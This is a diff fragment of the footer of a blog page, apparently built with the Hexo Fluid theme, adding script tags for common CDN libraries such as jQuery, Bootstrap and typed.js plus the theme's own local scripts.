+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
